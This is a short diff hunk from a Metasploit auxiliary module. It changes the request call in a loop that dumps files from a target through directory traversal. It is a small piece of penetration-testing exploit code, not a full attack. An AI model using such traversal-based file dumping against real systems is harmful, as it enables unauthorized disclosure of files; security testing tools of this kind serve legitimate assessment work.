@@ -104,7 +104,7 @@ class MetasploitModule < Msf::Auxiliary
     files.each do |path, info|
       print_status("Dumping #{path}")
 
-      res = send_request_raw(
+      res = send_request_cgi(
         'method'  => 'GET',
         'uri'     => dir_traversal(path),
         'partial' => true # Allow partial response due to timeout
